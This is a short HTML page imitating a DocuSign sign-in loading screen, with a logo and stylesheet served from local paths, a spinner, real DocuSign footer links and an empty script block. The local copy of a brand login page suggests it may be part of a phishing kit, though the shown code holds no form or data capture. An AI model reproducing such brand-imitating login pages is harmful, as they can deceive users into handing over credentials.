<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DocuSign Login - Enter email to start sign in</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <section class="user-login-container">
      <div class="main-login-box" style="justify-content: center;">
        <div style="height: fit-content;display: flex;flex-direction: column;justify-content: center;align-items: center;">
          <img class="logo-img" src="./img/docusign_logo_small.png" alt="" />
          <div style="margin:20px"></div>
          <svg class="spinner" width="40px" height="40px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
   <circle class="path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
</svg>
        </div>
       
      </div>
      <div class="footer">
        <div class="upper-links">
          <a href="http://www.docusign.com/support">Help</a>| <a href="https://www.docusign.com/company/terms-and-conditions/web">Terms</a>|
          <a href="https://www.docusign.com/IP">Intellectual Property</a>| <a href="https://www.docusign.com/company/privacy-policy">Privacy Policy</a>|
        </div>
        <div class="copyright">
          <p>Copyright © 2020 DocuSign, Inc. All rights reserved.</p>
        </div>
      </div>
    </section>
    <script>
      
    </script>
  </body>
</html>
